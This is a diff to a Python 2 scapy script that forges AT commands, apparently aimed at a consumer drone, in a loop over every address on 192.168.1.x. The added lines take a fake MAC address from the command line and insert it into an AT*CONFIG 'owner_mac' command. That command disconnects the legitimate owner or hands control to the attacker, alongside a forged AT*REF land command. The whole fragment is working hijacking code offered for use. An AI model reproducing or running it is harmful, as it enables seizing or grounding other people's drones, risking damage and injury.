@@ -5,11 +5,21 @@
 import os, sys
 from scapy.all import *
 
+def printUsage():
+    print "please include fake MAC address you want to use"
+    print "Usage: %s MAC_ADDRESS" % sys.argv[0]
+
 def isRoot():
     """Verifies if the current user is root"""
     return os.getuid() & os.getgid() == 0
 
 if __name__ == "__main__":
+
+    if len(sys.argv) < 2:
+        printUsage()
+        sys.exit(0)
+
+    fake_mac = sys.argv[1]
 
     if not isRoot():
         print "[-] Your have to be root to use scapy"
@@ -18,8 +28,10 @@ if __name__ == "__main__":
     # try packet forging attack
     try:
         while(True):
-            land_cmd = "AT*REF=%d,0\r" % 1 # seqno 1 is always accepted
-            disconnect_cmd = 'AT*CONFIG=1,"network:owner_mac","00:00:00:00:00:00"' # disconnects current owner
+            # seqno 1 is always accepted
+            land_cmd = "AT*REF=%d,0\r" % 1
+            # connects different owner, disconnects if 00:00:00:00:00:00
+            disconnect_cmd = 'AT*CONFIG=1,"network:owner_mac","%s"' % fake_mac
 
             for i in xrange(256): # 8 bits in last field
                 real_ip = '192.168.1.' + str(i)
